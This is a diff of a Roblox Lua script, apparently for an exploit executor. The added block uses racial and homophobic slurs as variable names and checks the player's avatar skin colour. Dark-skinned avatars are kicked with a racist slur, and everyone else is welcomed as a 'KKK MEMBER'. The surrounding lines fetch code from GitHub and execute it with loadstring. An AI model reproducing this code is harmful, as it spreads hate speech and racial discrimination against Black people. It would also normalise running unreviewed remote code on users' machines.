@@ -1,5 +1,27 @@
 loadstring(game:HttpGet("https://raw.githubusercontent.com/unicornnmann/Loading-Animation/refs/heads/main/Unicorn"))()
 
+-- made by mys
+local faggot = game.Players.LocalPlayer
+local cunt = faggot.Character or faggot.CharacterAdded:Wait()
+if cunt then
+    local nigger = game.Workspace:FindFirstChild(faggot.Name)
+    if nigger then
+        local skintone = nigger:FindFirstChild("Body Colors")
+        if skintone and skintone:IsA("BodyColors") then
+            local blackskin = skintone.HeadColor3
+            local h, s, v = Color3.toHSV(blackskin)
+            local isblacknigga = (blackskin.R >= 0.2 and blackskin.R <= 0.6) and 
+                            (blackskin.G >= 0.1 and blackskin.G <= 0.4) and 
+                            (blackskin.B >= 0.05 and blackskin.B <= 0.3)
+            if v < 0.3 or isblacknigga then
+                faggot:Kick("BLACK NIGGER DETECTED!")
+            else
+                print("Welcome KKK MEMBER! You have been whitelisted!")
+            end
+        end
+    end
+end
+
 loadstring(game:HttpGet('https://raw.githubusercontent.com/unicornnmann/Ducks/refs/heads/main/Ducks'))()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/unicornnmann/Treehouse/refs/heads/main/Treehouse"))()
 
